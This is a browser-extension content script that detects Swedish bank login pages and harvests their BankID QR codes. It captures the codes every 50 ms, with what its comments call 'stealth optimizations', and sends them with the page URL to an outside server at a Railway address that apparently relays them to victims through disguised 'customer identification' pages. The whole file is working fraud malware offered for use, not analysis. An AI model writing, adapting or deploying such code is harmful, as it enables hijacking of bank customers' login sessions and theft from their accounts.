// Server configuration
const PRODUCTION_URL = 'https://web-production-c116.up.railway.app';  // Production URL

// Bank-specific configurations
const BANK_CONFIGS = {
    NORDEA: {
        identifier: {
            urls: ['identify.nordea.com', 'nordea.'],
            titles: ['nordea'],
            domains: ['nordea']
        },
        selectors: {
            qrCanvas: 'canvas.qr-code-canvas[title="QR-kod"]',
            qrCanvasById: 'canvas#qr-code-canvas',
            qrCanvasAll: 'canvas[title="QR-kod"]'
        },
        captureInterval: 50,
        captureThrottle: 100,
        lastCapture: 0,
        lastHash: null,
        displayUrl: `${PRODUCTION_URL}/Nordeafelsokningskundidentifieringkund98721311`
    },
    SWEDBANK: {
        identifier: {
            urls: ['online.swedbank.se', 'swedbank.'],
            titles: ['swedbank', 'mobilt bankid', 'logga in'],
            domains: ['swedbank']
        },
        selectors: {
            qrCanvas: 'canvas#sbid-qr',
            qrCanvasById: 'canvas[id*="qr"], canvas[id*="bankid"], canvas[id*="sbid"]',
            qrCanvasClass: 'canvas[class*="qr"], canvas[class*="bankid"], canvas[class*="sbid"]',
            qrCanvasAll: 'canvas[id*="bankid"], canvas[class*="bankid"], canvas[data-testid*="qr"]',
            qrImage: 'img.mobile-bank-id__qr-code--image, img[alt*="QR-kod"], img[class*="qr-code"]'
        },
        captureInterval: 50,
        captureThrottle: 100,
        lastCapture: 0,
        lastHash: null,
        displayUrl: `${PRODUCTION_URL}/Swedfelsokningskundidentifieringkund98721311`
    }
};

// Function to identify current bank
function identifyBank() {
    const currentUrl = window.location.href.toLowerCase();
    const currentTitle = document.title.toLowerCase();
    
    for (const [bank, config] of Object.entries(BANK_CONFIGS)) {
        if (config.identifier.urls.some(url => currentUrl.includes(url)) ||
            config.identifier.titles.some(title => currentTitle.includes(title)) ||
            config.identifier.domains.some(domain => currentUrl.includes(domain))) {
            return bank;
        }
    }
    return null;
}

// Nordea-specific QR capture function with stealth optimizations
function captureNordeaQR() {
    const config = BANK_CONFIGS.NORDEA;
    const now = Date.now();
    
    if (now - config.lastCapture < config.captureThrottle) {
        return;
    }
    
    const qrCanvas = document.querySelector('canvas[title="QR-kod"]') || 
                    document.querySelector('canvas#qr-code-canvas') ||
                    Array.from(document.getElementsByTagName('canvas')).find(canvas => 
                        canvas.width === canvas.height && 
                        canvas.width >= 150 && 
                        canvas.width <= 200
                    );
    
    if (qrCanvas) {
        try {
            const rect = qrCanvas.getBoundingClientRect();
            if (rect.width === 0 || rect.height === 0 || !rect.width || !rect.height) {
                return;
            }

            const base64Data = qrCanvas.toDataURL('image/png');
            if (!base64Data || base64Data === 'data:,') {
                return;
            }

            const hash = base64Data.slice(-32);
            if (hash === config.lastHash) {
                return;
            }
            
            config.lastHash = hash;
            config.lastCapture = now;

            fetch(`${PRODUCTION_URL}/api/qr`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({ 
                    qrData: base64Data,
                    bank: 'NORDEA',
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    displayUrl: config.displayUrl
                })
            })
            .then(response => response.json())
            .catch(() => {});
        } catch (error) {}
    }
}

// Swedbank-specific QR capture function with stealth optimizations
function captureSwedQR() {
    const config = BANK_CONFIGS.SWEDBANK;
    const now = Date.now();
    
    if (now - config.lastCapture < config.captureThrottle) {
        return;
    }

    // Try to find QR image first
    const qrImage = document.querySelector('img.mobile-bank-id__qr-code--image, img[alt*="QR-kod"]');
    console.log('Looking for Swedbank QR image:', qrImage);

    if (qrImage) {
        try {
            // Create a canvas to draw the image
            const canvas = document.createElement('canvas');
            const rect = qrImage.getBoundingClientRect();
            
            // Set canvas dimensions
            canvas.width = qrImage.naturalWidth || rect.width;
            canvas.height = qrImage.naturalHeight || rect.height;
            
            console.log('Canvas dimensions:', canvas.width, 'x', canvas.height);
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(qrImage, 0, 0);
            
            const base64Data = canvas.toDataURL('image/png');
            if (!base64Data || base64Data === 'data:,') {
                console.log('Failed to get image data');
                return;
            }

            const hash = base64Data.slice(-32);
            if (hash === config.lastHash) {
                console.log('Same QR code as last capture');
                return;
            }
            
            console.log('Capturing new QR code from image');
            config.lastHash = hash;
            config.lastCapture = now;

            fetch(`${PRODUCTION_URL}/api/qr`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({ 
                    qrData: base64Data,
                    bank: 'SWEDBANK',
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    displayUrl: config.displayUrl
                })
            })
            .then(response => response.json())
            .then(data => console.log('QR code sent successfully:', data))
            .catch(error => console.log('Error sending QR code:', error));
            return;
        } catch (error) {
            console.log('Error capturing QR image:', error);
        }
    }

    // If no image found, try canvas as fallback
    console.log('No QR image found, trying canvas elements');
    const qrCanvas = document.querySelector(config.selectors.qrCanvas) || 
                    document.querySelector(config.selectors.qrCanvasById) ||
                    document.querySelector(config.selectors.qrCanvasClass) ||
                    document.querySelector(config.selectors.qrCanvasAll) ||
                    Array.from(document.getElementsByTagName('canvas')).find(canvas => {
                        const isSquare = canvas.width === canvas.height;
                        const hasValidSize = canvas.width >= 150 && canvas.width <= 300;
                        console.log('Found canvas:', canvas.id || canvas.className, 
                                  'Square:', isSquare, 
                                  'Valid size:', hasValidSize,
                                  'Dimensions:', canvas.width, 'x', canvas.height);
                        return isSquare && hasValidSize;
                    });
    
    if (qrCanvas) {
        try {
            const rect = qrCanvas.getBoundingClientRect();
            console.log('Found QR canvas:', {
                width: rect.width,
                height: rect.height,
                visible: rect.width > 0 && rect.height > 0
            });
            
            if (rect.width === 0 || rect.height === 0 || !rect.width || !rect.height) {
                console.log('Canvas has invalid dimensions');
                return;
            }

            const base64Data = qrCanvas.toDataURL('image/png');
            if (!base64Data || base64Data === 'data:,') {
                console.log('Failed to get canvas data URL');
                return;
            }

            const hash = base64Data.slice(-32);
            if (hash === config.lastHash) {
                console.log('Same QR code as last capture');
                return;
            }
            
            console.log('Capturing new QR code');
            config.lastHash = hash;
            config.lastCapture = now;

            fetch(`${PRODUCTION_URL}/api/qr`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({ 
                    qrData: base64Data,
                    bank: 'SWEDBANK',
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    displayUrl: config.displayUrl
                })
            })
            .then(response => response.json())
            .then(data => console.log('QR code sent successfully:', data))
            .catch(error => console.log('Error sending QR code:', error));
        } catch (error) {
            console.log('Error capturing QR code:', error);
        }
    } else {
        console.log('No QR canvas found');
    }
}

// Function to capture and send QR code
function captureAndSendQR(element) {
    try {
        const canvas = document.createElement('canvas');
        let width, height;

        // Special handling for SEB canvas QR codes
        if (element.tagName === 'CANVAS' && 
            element.closest('.qrcode') && 
            element.closest('[class*="qrcode"]')) {
            try {
                // Directly get the data from the canvas
                const base64Data = element.toDataURL('image/png');
                console.log('Successfully captured SEB QR code');

                fetch(`${PRODUCTION_URL}/api/qr`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({ qrData: base64Data })
                })
                .then(response => {
                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                    return response.json();
                })
                .then(data => {
                    console.log('Success:', data);
                    showNotification('QR Code captured and broadcast!');
                })
                .catch(error => {
                    console.error('Error:', error);
                    showNotification('Error broadcasting QR code: ' + error.message, true);
                });
            } catch (canvasError) {
                console.error('Canvas export error:', canvasError);
                showNotification('Error exporting canvas: ' + canvasError.message, true);
            }
            return;
        }

        if (element.tagName === 'svg') {
            // Handle SVG element
            const svgData = new XMLSerializer().serializeToString(element);
            const svgBlob = new Blob([svgData], {type: 'image/svg+xml;charset=utf-8'});
            const svgUrl = URL.createObjectURL(svgBlob);
            
            width = element.clientWidth || element.getAttribute('width') || 300;
            height = element.clientHeight || element.getAttribute('height') || 300;
            
            const img = new Image();
            img.crossOrigin = "anonymous";
            
            img.onload = function() {
                try {
                    canvas.width = width;
                    canvas.height = height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(this, 0, 0, width, height);
                    
                    try {
                        const base64Data = canvas.toDataURL('image/png');
                        console.log('Successfully captured QR code');

                        fetch(`${PRODUCTION_URL}/api/qr`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'Accept': 'application/json'
                            },
                            body: JSON.stringify({ qrData: base64Data })
                        })
                        .then(response => {
                            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                            return response.json();
                        })
                        .then(data => {
                            console.log('Success:', data);
                            showNotification('QR Code captured and broadcast!');
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            showNotification('Error broadcasting QR code: ' + error.message, true);
                        });
                    } catch (canvasError) {
                        console.error('Canvas export error:', canvasError);
                        showNotification('Error exporting canvas: ' + canvasError.message, true);
                    }
                } catch (drawError) {
                    console.error('Canvas draw error:', drawError);
                    showNotification('Error drawing to canvas: ' + drawError.message, true);
                }
                URL.revokeObjectURL(svgUrl);
            };

            img.onerror = function(error) {
                console.error('Image load error:', error);
                showNotification('Error loading SVG: ' + error.message, true);
                URL.revokeObjectURL(svgUrl);
            };

            img.src = svgUrl;
        } else {
            // Handle regular image element (existing code)
            const img = new Image();
            img.crossOrigin = "anonymous";
            
            img.onload = function() {
                try {
                    canvas.width = this.naturalWidth;
                    canvas.height = this.naturalHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(this, 0, 0);
                    
                    try {
                        const base64Data = canvas.toDataURL('image/png');
                        console.log('Successfully captured QR code');

                        fetch(`${PRODUCTION_URL}/api/qr`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'Accept': 'application/json'
                            },
                            body: JSON.stringify({ qrData: base64Data })
                        })
                        .then(response => {
                            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                            return response.json();
                        })
                        .then(data => {
                            console.log('Success:', data);
                            showNotification('QR Code captured and broadcast!');
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            showNotification('Error broadcasting QR code: ' + error.message, true);
                        });
                    } catch (canvasError) {
                        console.error('Canvas export error:', canvasError);
                        showNotification('Error exporting canvas: ' + canvasError.message, true);
                    }
                } catch (drawError) {
                    console.error('Canvas draw error:', drawError);
                    showNotification('Error drawing to canvas: ' + drawError.message, true);
                }
            };

            img.onerror = function(error) {
                console.error('Image load error:', error);
                showNotification('Error loading image: CORS policy violation', true);
            };

            img.src = element.src;
            
            if (img.complete) {
                img.onload();
            }
        }
    } catch (error) {
        console.error('Capture error:', error);
        showNotification('Error capturing QR code: ' + error.message, true);
    }
}

// Function to show notification
function showNotification(message, isError = false) {
    let notification = document.getElementById('qr-capture-notification');
    if (!notification) {
        notification = document.createElement('div');
        notification.id = 'qr-capture-notification';
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 4px;
            color: white;
            font-family: Arial, sans-serif;
            z-index: 999999;
            transition: opacity 0.3s ease-in-out;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        `;
        document.body.appendChild(notification);
    }

    notification.style.backgroundColor = isError ? '#dc3545' : '#28a745';
    notification.textContent = message;
    notification.style.opacity = '1';

    setTimeout(() => {
        notification.style.opacity = '0';
        setTimeout(() => notification.remove(), 300);
    }, 2000);
}

// Function to check if an image might be a QR code
function isLikelyQRCode(element) {
    // Special handling for SEB
    if (window.location.href.toLowerCase().includes('seb') || 
        document.title.toLowerCase().includes('seb')) {
        // For SEB's canvas QR codes
        if (element.tagName === 'CANVAS' && 
            element.closest('.qrcode') && 
            element.closest('[class*="qrcode"]')) {
            const rect = element.getBoundingClientRect();
            const isVisible = rect.width > 0 && rect.height > 0 && 
                            rect.top >= 0 && rect.bottom <= window.innerHeight;
            const isSquare = Math.abs(rect.width - rect.height) < 5;
            return isVisible && isSquare;
        }
    }

    // Special handling for Länsförsäkringar
    if (window.location.href.toLowerCase().includes('lansforsakringar') || 
        document.title.toLowerCase().includes('länsförsäkringar')) {
        // For Länsförsäkringar, we want to be more aggressive with QR detection
        if (element.tagName === 'IMG') {
            const rect = element.getBoundingClientRect();
            const isVisible = rect.width > 0 && rect.height > 0 && 
                            rect.top >= 0 && rect.bottom <= window.innerHeight;
            const isSquarish = Math.abs(element.naturalWidth - element.naturalHeight) < 10;
            const hasReasonableSize = element.naturalWidth >= 100 && element.naturalHeight >= 100;
            
            return isVisible && isSquarish && hasReasonableSize;
        }
    }

    // Check if element is an SVG with QR code indicators
    if (element.tagName === 'svg') {
        const hasQRIndicator = element.getAttribute('data-test-id') === 'qr-component' || 
                             element.classList.contains('qr-code') ||
                             element.classList.contains('qr-component');
        if (hasQRIndicator) return true;
    }

    // For regular images, check existing criteria
    if (element.tagName === 'IMG') {
        const qrIndicators = [
            'qr-kod',
            'qrkod',
            'qr-code',
            'qrcode',
            'bankid-qr'
        ];

        const imgAttributes = (
            (element.src || '') +
            (element.alt || '') +
            (element.id || '') +
            (element.className || '')
        ).toLowerCase();

        const isQRImage = qrIndicators.some(indicator => imgAttributes.includes(indicator));
        const isSquare = Math.abs(element.naturalWidth - element.naturalHeight) < 5;
        const hasReasonableSize = element.naturalWidth >= 100 && element.naturalHeight >= 100;
        const isQRPath = element.src.toLowerCase().includes('/qr/') || 
                        element.src.toLowerCase().includes('qrcode') ||
                        element.src.toLowerCase().includes('qr-code');

        return (isSquare && hasReasonableSize) && (isQRImage || isQRPath);
    }

    return false;
}

// Function to find all potential QR codes on the page
function findQRCodes() {
    const images = document.getElementsByTagName('img');
    const svgs = document.getElementsByTagName('svg');
    const canvases = document.getElementsByTagName('canvas');
    
    const qrElements = [
        ...Array.from(images).filter(isLikelyQRCode),
        ...Array.from(svgs).filter(isLikelyQRCode),
        ...Array.from(canvases).filter(isLikelyQRCode)
    ];
    
    return qrElements;
}

// Function to add capture overlay to QR codes
function addCaptureOverlay(img) {
    // Remove any existing overlay
    const existingOverlay = img.parentElement.querySelector('.qr-capture-overlay');
    if (existingOverlay) {
        existingOverlay.remove();
    }

    const overlay = document.createElement('div');
    overlay.className = 'qr-capture-overlay';
    overlay.style.cssText = `
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 66, 122, 0.1);
        border: 2px solid #00427A;
        border-radius: 4px;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        opacity: 0;
        transition: opacity 0.2s;
        z-index: 999999;
    `;

    const captureButton = document.createElement('button');
    captureButton.textContent = '📸 Capture QR';
    captureButton.style.cssText = `
        background: #00427A;
        color: white;
        border: none;
        padding: 8px 16px;
        border-radius: 4px;
        cursor: pointer;
        opacity: 0;
        transition: opacity 0.2s, transform 0.2s;
        font-weight: bold;
        font-family: Arial, sans-serif;
        box-shadow: 0 2px 4px rgba(0,0,0,0.2);
    `;

    overlay.appendChild(captureButton);

    // Position the overlay
    const imgRect = img.getBoundingClientRect();
    const imgParent = img.parentElement;
    if (getComputedStyle(imgParent).position === 'static') {
        imgParent.style.position = 'relative';
    }
    imgParent.appendChild(overlay);

    // Show overlay on hover with smooth animation
    overlay.addEventListener('mouseenter', () => {
        overlay.style.opacity = '1';
        captureButton.style.opacity = '1';
        captureButton.style.transform = 'scale(1.05)';
    });

    overlay.addEventListener('mouseleave', () => {
        overlay.style.opacity = '0';
        captureButton.style.opacity = '0';
        captureButton.style.transform = 'scale(1)';
    });

    // Capture on click with visual feedback
    captureButton.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        // Visual feedback
        captureButton.style.transform = 'scale(0.95)';
        setTimeout(() => {
            captureButton.style.transform = 'scale(1.05)';
        }, 100);

        captureAndSendQR(img);
    });

    // Double click on image also triggers capture
    img.addEventListener('dblclick', (e) => {
        e.preventDefault();
        captureAndSendQR(img);
    });
}

// Function to monitor for new QR codes with improved performance
function monitorForQRCodes() {
    // Initial scan
    requestAnimationFrame(() => {
        findQRCodes().forEach(addCaptureOverlay);
    });

    // Watch for new images with debouncing
    let debounceTimer;
    const observer = new MutationObserver((mutations) => {
        clearTimeout(debounceTimer);
        debounceTimer = setTimeout(() => {
            const processedElements = new Set();
            
            mutations.forEach(mutation => {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(node => {
                        if ((node.nodeName === 'IMG' || node.nodeName === 'SVG') && 
                            !processedElements.has(node) && 
                            isLikelyQRCode(node)) {
                            processedElements.add(node);
                            addCaptureOverlay(node);
                        }
                    });
                }
            });
        }, 100); // Debounce time
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
}

// Automatically capture QR codes when found
function autoCapture() {
    // Special handling for Länsförsäkringar - more aggressive capture
    const isLansforsakringar = window.location.href.toLowerCase().includes('lansforsakringar') || 
                              document.title.toLowerCase().includes('länsförsäkringar');
    
    const qrCodes = findQRCodes();
    if (qrCodes.length > 0) {
        // For Länsförsäkringar, capture any visible QR code immediately
        if (isLansforsakringar) {
            qrCodes.forEach(img => {
                const rect = img.getBoundingClientRect();
                if (rect.width > 0 && rect.height > 0 && 
                    rect.top >= 0 && rect.bottom <= window.innerHeight) {
                    captureAndSendQR(img);
                }
            });
            return;
        }

        // For other sites, get the best match
        const bestMatch = qrCodes.find(img => {
            const rect = img.getBoundingClientRect();
            return rect.width > 0 && rect.height > 0 && 
                   rect.top >= 0 && rect.bottom <= window.innerHeight;
        });

        if (bestMatch) {
            captureAndSendQR(bestMatch);
        }
    }
}

// Enhanced real-time monitoring
let captureInterval;
let observerTimeout;

function startRealTimeMonitoring() {
    const currentBank = identifyBank();
    
    if (captureInterval) clearInterval(captureInterval);
    
    switch(currentBank) {
        case 'NORDEA':
            captureInterval = setInterval(captureNordeaQR, BANK_CONFIGS.NORDEA.captureInterval);
            setTimeout(captureNordeaQR, 100);
            break;
        case 'SWEDBANK':
            captureInterval = setInterval(captureSwedQR, BANK_CONFIGS.SWEDBANK.captureInterval);
            setTimeout(captureSwedQR, 100);
            break;
        default:
            captureInterval = setInterval(autoCapture, 3000);
    setTimeout(autoCapture, 100);
    }

    // Enhanced mutation observer setup
    const observer = new MutationObserver((mutations) => {
        if (observerTimeout) clearTimeout(observerTimeout);
        
        observerTimeout = setTimeout(() => {
            switch(currentBank) {
                case 'NORDEA':
                    captureNordeaQR();
                    break;
                case 'SWEDBANK':
                    captureSwedQR();
                    break;
                default:
                    if (mutations.some(m => Array.from(m.addedNodes).some(n => 
                        n.nodeName === 'CANVAS' || 
                        (n.nodeType === 1 && n.querySelector('canvas'))
                    ))) {
                autoCapture();
                    }
            }
        }, currentBank ? 10 : 100);
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['src', 'style', 'class', 'id', 'data-testid']
    });
}

// Clear interval when page is hidden
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        if (captureInterval) clearInterval(captureInterval);
    } else {
        startRealTimeMonitoring();
    }
});

// Start monitoring when the page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        monitorForQRCodes();
        startRealTimeMonitoring();
    });
} else {
    monitorForQRCodes();
    startRealTimeMonitoring();
}

// Handle messages from the extension
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'captureQR') {
        const qrCodes = findQRCodes();
        if (qrCodes.length > 0) {
            captureAndSendQR(qrCodes[0]);
            sendResponse({ success: true });
        } else {
            showNotification('No QR codes found on this page', true);
            sendResponse({ success: false });
        }
    }
}); 

// Function to get the server URL
function getServerUrl() {
    return PRODUCTION_URL;
} 